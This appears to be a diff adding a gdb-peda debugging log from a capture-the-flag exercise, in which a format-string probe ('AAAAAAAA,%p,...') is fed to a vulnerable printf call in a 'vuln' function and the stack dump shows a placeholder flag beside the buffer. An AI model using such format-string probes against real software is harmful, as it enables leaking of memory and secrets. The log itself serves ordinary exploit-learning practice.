@@ -1,0 +1,51 @@
+gdb-peda$ c
+Continuing.
+hello, what's your name?
+AAAAAAAA,%
+Program received signal SIGALRM, Alarm clock.
+p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x0 
+RSI: 0x6c6c6568 ('hell')
+RDI: 0x7fffffffddc0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p")
+RBP: 0x7fffffffddf0 --> 0x7fffffffde00 --> 0x555555554930 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffdd90 --> 0x0 
+RIP: 0x5555555548ea (<vuln+144>:	call   0x555555554700 <printf@plt>)
+R8 : 0x7ffff7fd64c0 (0x00007ffff7fd64c0)
+R9 : 0x7ffff7fd64c0 (0x00007ffff7fd64c0)
+R10: 0x555555756010 --> 0x0 
+R11: 0x246 
+R12: 0x555555554750 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdee0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555555548de <vuln+132>:	lea    rax,[rbp-0x30]
+   0x5555555548e2 <vuln+136>:	mov    rdi,rax
+   0x5555555548e5 <vuln+139>:	mov    eax,0x0
+=> 0x5555555548ea <vuln+144>:	call   0x555555554700 <printf@plt>
+   0x5555555548ef <vuln+149>:	nop
+   0x5555555548f0 <vuln+150>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x5555555548f4 <vuln+154>:	xor    rax,QWORD PTR fs:0x28
+   0x5555555548fd <vuln+163>:	je     0x555555554904 <vuln+170>
+Guessed arguments:
+arg[0]: 0x7fffffffddc0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p")
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd90 --> 0x0 
+0008| 0x7fffffffdd98 --> 0x555555756260 --> 0x0 
+0016| 0x7fffffffdda0 ("flag{", '1' <repeats 22 times>)
+0024| 0x7fffffffdda8 ('1' <repeats 19 times>)
+0032| 0x7fffffffddb0 ('1' <repeats 11 times>)
+0040| 0x7fffffffddb8 --> 0x313131 ('111')
+0048| 0x7fffffffddc0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p")
+0056| 0x7fffffffddc8 (",%p,%p,%p,%p,%p,%p,%p")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x00005555555548ea in vuln ()
+gdb-peda$ 
